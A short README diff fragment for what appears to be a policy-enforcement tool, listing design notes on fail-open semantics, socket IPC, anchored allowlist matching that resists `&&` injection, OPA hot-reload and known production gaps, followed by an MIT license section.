-- Fail-open vs. fail-secure semantics at each layer
-- Unix socket IPC: 3.6µs round-trip vs. ~500µs for HTTP
-- Session ring buffer design and `BaselineEstablished` flag
-- Allowlist glob security contract (anchored match, injection via `&&` suffix fails)
-- OPA/Rego for policy: hot-reload via `atomic.Pointer`, RCU pattern
-- Known production gaps: IPC authentication, decision cache, WAL auto-replay
+---
+
+## License
+
+MIT. See [LICENSE](LICENSE).
